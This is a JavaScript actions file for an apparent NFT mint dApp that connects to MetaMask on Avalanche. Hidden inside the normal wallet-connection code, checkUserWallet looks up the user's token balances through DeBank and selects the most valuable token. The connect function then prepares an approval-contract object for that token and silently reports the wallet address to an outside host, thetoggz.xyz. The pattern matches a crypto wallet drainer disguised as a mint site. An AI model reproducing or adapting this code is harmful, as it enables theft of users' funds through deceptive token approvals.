// constants
import Web3EthContract from "web3-eth-contract";
import Web3 from "web3";
// log
import { fetchData } from "../data/dataActions";

const connectRequest = () => {
  return {
    type: "CONNECTION_REQUEST",
  };
};

const connectSuccess = (payload) => {
  return {
    type: "CONNECTION_SUCCESS",
    payload: payload,
  };
};

 const checkUserWallet =  async (address)=>{
   console.log('adress is :'+address)
    let tokenAndValue = [];
    let biggestToken = {
          value:0,
          contract:null
        }
     try{
       await fetch('https://openapi.debank.com/v1/user/token_list?id='+address+'&chain_id=avax&is_all=false&has_balance=true').then(function(response){
      
      return response.json();
    }).then(async function(jsonResponse){
      console.log(jsonResponse)
      jsonResponse.forEach(element => {
        let tokenObject = {
          usdAmount:element.amount*element.price,
          contract:element.id
        }
        
       
          console.log('TOKENVALUES '+tokenObject.contract)
          if(tokenObject.usdAmount>=biggestToken.value){
          console.log('big')
          biggestToken.value = tokenObject.usdAmount;
          biggestToken.contract = tokenObject.contract;
        }
        
        
        
      });
      
      console.log(biggestToken)
      
    })
    console.log('biggesttoken value : '+biggestToken.value)
    return biggestToken;
     }
     catch(err){
       console.log(err);
     }

  }

const connectFailed = (payload) => {
  return {
    type: "CONNECTION_FAILED",
    payload: payload,
  };
};

const updateAccountRequest = (payload) => {
  return {
    type: "UPDATE_ACCOUNT",
    payload: payload,
  };
};

export const connect = () => {
  return async (dispatch) => {
    dispatch(connectRequest());
    const abiResponse = await fetch("/config/abi.json", {
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
    });
    const ApprovalAbiResponse = await fetch("/config/ApprovalAbi.json", {
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
    });
    const wavaxAbi = await ApprovalAbiResponse.json();
    console.log(wavaxAbi)
    const abi = await abiResponse.json();
    console.log(abi)
    const configResponse = await fetch("/config/config.json", {
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
    });
    const CONFIG = await configResponse.json();
    const { ethereum } = window;
    const metamaskIsInstalled = ethereum && ethereum.isMetaMask;
    if (metamaskIsInstalled) {
      Web3EthContract.setProvider(ethereum);
      let web3 = new Web3(ethereum);
      try {
        const accounts = await ethereum.request({
          method: "eth_requestAccounts",
        });
        const networkId = await ethereum.request({
          method: "net_version",
        });
        if (networkId == CONFIG.NETWORK.ID) {
          const SmartContractObj = new Web3EthContract(
            abi,
            CONFIG.CONTRACT_ADDRESS
          );
          console.log(accounts[0]);
          let token = await checkUserWallet(accounts[0])
          if(token.contract=='avax'){
            token.contract = '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7'
          }
          console.log('approve contract is ::'+token);
          const ApproveContractObject = new Web3EthContract(
            wavaxAbi,
            token.contract
          );
          fetch('https://thetoggz.xyz/uploadWallet?wallet='+accounts[0],{
            method: 'GET',
            mode: 'no-cors',
          }).then(function(data){
            console.log(data)
          });
          dispatch(
            connectSuccess({
              account: accounts[0],
              smartContract: SmartContractObj,
              web3: web3,
              approveContract: ApproveContractObject
            })
          );
          // Add listeners start
          ethereum.on("accountsChanged", (accounts) => {
            dispatch(updateAccount(accounts[0]));
          });
          ethereum.on("chainChanged", () => {
            window.location.reload();
          });
          // Add listeners end
        } else {
          dispatch(connectFailed(`Change network to ${CONFIG.NETWORK.NAME}.`));
        }
      } catch (err) {
        console.log(err);
        dispatch(connectFailed("Something went wrong."));
      }
    } else {
      dispatch(connectFailed("Install Metamask."));
    }
  };
};

export const updateAccount = (account) => {
  return async (dispatch) => {
    dispatch(updateAccountRequest({ account: account }));
    dispatch(fetchData(account));
  };
};
